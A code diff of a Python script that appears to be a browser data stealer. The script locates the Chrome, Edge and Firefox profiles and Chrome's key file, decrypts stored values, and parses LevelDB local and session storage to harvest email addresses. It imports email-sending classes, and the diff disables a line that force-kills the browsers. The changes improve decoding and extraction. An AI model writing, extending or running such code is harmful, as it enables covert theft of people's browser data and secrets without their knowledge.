@@ -13,7 +13,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders 
 import urllib.parse
-from pathlib import Path
+from chardet import detect
 import plyvel
 import snappy
 import json
@@ -26,8 +26,18 @@ edge_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User D
 firefox_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
 local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Local State')
 email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
-os.system("taskkill /F /IM chrome.exe /IM msedge.exe /IM firefox.exe >nul 2>&1")
+#os.system("taskkill /F /IM chrome.exe /IM msedge.exe /IM firefox.exe >nul 2>&1")
 
+def decode_with_fallback(data):
+    
+    for encoding in ['utf-8', 'utf-16-le', 'latin1']:
+        try:
+            return data.decode(encoding), encoding
+        except:
+            continue
+
+    encoding = detect(data)['encoding'] or 'utf-8'
+    return data.decode(encoding, errors='replace'), encoding
 
 def bytes_to_hex(byte_data):
     return f"b'{''.join(f'\\x{byte:02x}' for byte in byte_data)}'"
@@ -48,6 +58,24 @@ def decrypt_value(encrypted_value, key):
     except Exception as e:
         # print(f"Decryption failed: {e}")
         return None
+    
+def find_emails_in_json(data, email_pattern):
+    emails = []
+    if isinstance(data, dict):
+        for v in data.values():
+            emails.extend(find_emails_in_json(v, email_pattern))
+    elif isinstance(data, list):
+        for item in data:
+            emails.extend(find_emails_in_json(item, email_pattern))
+    elif isinstance(data, str):
+        emails.extend(re.findall(email_pattern, data))
+    return emails
+
+def extract_json(value_str):
+    json_start = re.search(r'[\{\[]', value_str)
+    if json_start:
+        return value_str[json_start.start():]
+    return value_str
 
 def chromEdgeOnly(chrome_path, email_pattern, browser_name):
     profiles = [f for f in os.listdir(chrome_path) if f.startswith('Profile') or f == 'Default']
@@ -80,26 +108,38 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name):
                 db = plyvel.DB(str(tlsDatPath), create_if_missing=False)
                 for key, value in db:
                     try:
-                        key_str = key.decode('utf-8', errors='ignore')
-                        if value.startswith(b'\x01\x00\x00\x00'):  # Snappy compressed block indicator
+                        key_str = key.decode('utf-8', errors='replace')
+                        if key_str.startswith("META"):
+                            continue
+                        if value.startswith(b'\x00\x00\x00\x00') or value.startswith(b'\x01\x00\x00\x00'):  # Snappy compressed block indicator
                             try:
-                                value = snappy.uncompress(value)
+                                value = snappy.uncompress(value[4:])
+                                emails.extend(re.findall(email_pattern, value.decode('utf-8')))
+                                continue
                             except Exception as e :
                                 print(f"Error decompressing value: {e}, skipping this entry.")
-                        value_str = value.decode('utf-8', errors='ignore')
-                        try:
-                            decoded_json = json.loads(value_str)
-                            if isinstance(decoded_json, dict):
-                                value_str = json.dumps(decoded_json)
-                        except:
-                            pass
+                        value_str, value_enc = decode_with_fallback(value)
+                        value_str = value_str.replace('\u263a', '').strip()
+                        value_str = extract_json(value_str)
+                        print(f"for value : {value_enc}")
                         decoded = f"{key_str} {value_str}"
                         #print(decoded)
-                        print(value_str)
+                        print(value_str.strip())
+                        if value_str.strip().startswith('{') or value_str.strip().startswith('['):
+                            try:
+                                json_data = json.loads(value_str)
+                                #value_str = json.dumps(json_data, indent=2)
+                                #value_str = urllib.parse.unquote(value_str)
+                                #emails.extend(re.findall(email_pattern, value_str))
+                                emails.extend(find_emails_in_json(json_data, email_pattern))
+                                continue
+                            except:
+                                pass
                         emails.extend(re.findall(email_pattern, key_str))
                         emails.extend(re.findall(email_pattern, value_str))
                     except Exception as e:
                         print(f"Error processing entry with key {key_str}: {e}")
+                        continue
                 db.close()
             except Exception as e:
                 print(f"ERROR PARSING LOCAL STORAGE : {e}")
@@ -113,13 +153,16 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name):
                 db = plyvel.DB(str(tssDatPath), create_if_missing=False)
                 for key, value in db:
                     try:
-                        key_str = key.decode('utf-8', errors='ignore')
-                        if value.startswith(b'\x01\x00\x00\x00'):  # Snappy compressed block indicator
+                        key_str = key.decode('utf-8', errors='replace')
+                        if value.startswith(b'\x01\x00\x00\x00') or value.startswith(b'\x00\x00\x00\x00'):  # Snappy compressed block indicator
                             try:
-                                value = snappy.uncompress(value)
+                                value = snappy.uncompress(value[4:])
+                                emails.extend(re.findall(email_pattern, value.decode('utf-8')))
+                                continue
                             except Exception as e :
                                 print(f"Error decompressing value: {e}, skipping this entry.")
-                        value_str = value.decode('utf-8', errors='ignore')
+                        value_str, value_enc = decode_with_fallback(value)
+                        print(f"for value : {value_enc}")
                         decoded = f"{key_str} {value_str}"
                         #print(decoded)
                         emails.extend(re.findall(email_pattern, key_str))
